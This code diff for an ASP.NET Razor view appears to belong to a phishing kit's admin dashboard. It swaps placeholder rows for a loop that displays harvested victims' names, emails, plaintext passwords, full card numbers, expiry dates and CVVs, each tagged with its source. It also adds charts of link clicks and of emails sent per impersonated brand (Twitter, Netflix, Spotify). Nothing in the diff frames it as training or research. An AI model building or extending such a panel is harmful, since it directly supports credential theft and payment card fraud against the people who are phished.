@@ -1,7 +1,8 @@
 ﻿@{
     ViewData["Title"] = "Home Page";
+    var phisingInfo = ViewData["PhisingInfos"] as List<PhishingUserInfoViewModel>;
 }
-    
+
 <div class="container-fluid px-4">
     <h1 class="mt-4">Dashboard</h1>
     <div class="card mb-4">
@@ -19,6 +20,7 @@
                         <th>CC Number</th>
                         <th>CC Expiry</th>
                         <th>CC CVV</th>
+                        <th>Source</th>
                     </tr>
                 </thead>
                 <tfoot>
@@ -29,33 +31,22 @@
                         <th>CC Number</th>
                         <th>CC Expiry</th>
                         <th>CC CVV</th>
+                        <th>Source</th>
                     </tr>
                 </tfoot>
                 <tbody>
-                    <tr>
-                        <td>Michael Smith</td>
-                        <td>test1@test.com</td>
-                        <td>password1</td>
-                        <td>5339 8626 0077 8686</td>
-                        <td>06/2021</td>
-                        <td>183</td>
-                    </tr>
-                    <tr>
-                        <td>Ashley Hernandez</td>
-                        <td>test2@test.com</td>
-                        <td>password2</td>
-                        <td>5339 8626 0012 8064</td>
-                        <td>05/2025</td>
-                        <td>902</td>
-                    </tr>
-                    <tr>
-                        <td>David Moore</td>
-                        <td>test3@test.com</td>
-                        <td>password3</td>
-                        <td>5339 8626 0097 8021</td>
-                        <td>02/2021</td>
-                        <td>222</td>
-                    </tr>
+                    @foreach (var user in phisingInfo)
+                    {
+                        <tr>
+                            <td>@user.Name</td>
+                            <td>@user.Email</td>
+                            <td>@user.Password</td>
+                            <td>@user.CreditCardNumber</td>
+                            <td>@user.CreditCardExpirationDate</td>
+                            <td>@user.CreditCardCVV</td>
+                            <td>@user.Source</td>
+                        </tr>
+                    }
                 </tbody>
             </table>
         </div>
@@ -65,9 +56,29 @@
             <div class="card mb-4">
                 <div class="card-header">
                     <i class="fas fa-chart-pie me-1"></i>
-                    Pie Chart
+                    Click Counts (Total: @ViewData["TotalCount"])
                 </div>
-                <div class="card-body"><canvas id="myPieChart" width="100%" height="50"></canvas></div>
+                <div class="card-body"><canvas id="isClickedChart" width="100%" height="50"></canvas></div>
+            </div>
+        </div>
+        <div class="col-lg-6">
+            <div class="card mb-4">
+                <div class="card-header">
+                    <i class="fas fa-chart-pie me-1"></i>
+                    Clicks Per Site
+                </div>
+                <div class="card-body"><canvas id="clicksPerSiteChart" width="100%" height="50"></canvas></div>
+            </div>
+        </div>
+    </div>
+    <div class="row">
+        <div class="col-lg-6">
+            <div class="card mb-4">
+                <div class="card-header">
+                    <i class="fas fa-chart-pie me-1"></i>
+                    Sent Emails Per Site
+                </div>
+                <div class="card-body"><canvas id="sentEmailsPerSiteChart" width="100%" height="50"></canvas></div>
             </div>
         </div>
     </div>
@@ -84,6 +95,44 @@
                 new simpleDatatables.DataTable(datatablesReport);
             }
         });
+
+        Chart.defaults.global.defaultFontFamily = '-apple-system,system-ui,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif';
+        Chart.defaults.global.defaultFontColor = '#292b2c';
+
+        var ctx = document.getElementById("isClickedChart");
+        var isClickedChart = new Chart(ctx, {
+            type: 'pie',
+            data: {
+                labels: ["Clicked", "Not Clicked",],
+                datasets: [{
+                    data: [@ViewData["ClickedCount"], @ViewData["NotClickedCount"]],
+                    backgroundColor: ['#008000', '#FF0000'],
+                }],
+            },
+        });
+
+        var ctx = document.getElementById("clicksPerSiteChart");
+        var myPieChart = new Chart(ctx, {
+            type: 'pie',
+            data: {
+                labels: ["Twitter", "Netflix", "Spotify"],
+                datasets: [{
+                    data: [@ViewData["TwitterClickedCount"], @ViewData["NetflixClickedCount"], @ViewData["SpotifyClickedCount"]],
+                    backgroundColor: ['#1DA1F2', '#E50914', '#1ED760'],
+                }],
+            },
+        });
+
+        var ctx = document.getElementById("sentEmailsPerSiteChart");
+        var myPieChart = new Chart(ctx, {
+            type: 'pie',
+            data: {
+                labels: ["Twitter", "Netflix", "Spotify"],
+                datasets: [{
+                    data: [@ViewData["TwitterEmailSentCount"], @ViewData["NetflixEmailSentCount"], @ViewData["SpotifyEmailSentCount"]],
+                    backgroundColor: ['#1DA1F2', '#E50914', '#1ED760'],
+                }],
+            },
+        });
     </script>
-    <script src="~/assets/demo/chart-pie-demo.js"></script>
 }
